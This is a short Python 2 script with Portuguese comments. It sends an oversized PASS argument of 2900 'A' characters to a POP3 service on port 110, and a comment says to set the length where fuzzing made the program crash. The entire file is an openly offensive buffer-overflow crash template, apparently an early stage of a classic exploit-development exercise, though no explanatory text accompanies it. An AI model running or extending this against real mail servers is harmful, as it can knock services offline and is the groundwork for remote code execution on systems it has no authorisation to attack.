#!/usr/bin/python
import socket
bytes="A" * 2900 #<-- Aqui deve ser colocado o valor onde o programa trava no fuzzing
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("host",110))
        r = s.recv(1024)
        print r

        s.send("USER usuario\r\n")
        r = s.recv(1024)
        print r

        s.send("PASS "+bytes+"\r\n")
        r = s.recv(1024)
        print r

        s.send("QUIT\r\n")
        r = s.recv(1024)
        print r
except:
        print "Erro ao conectar"
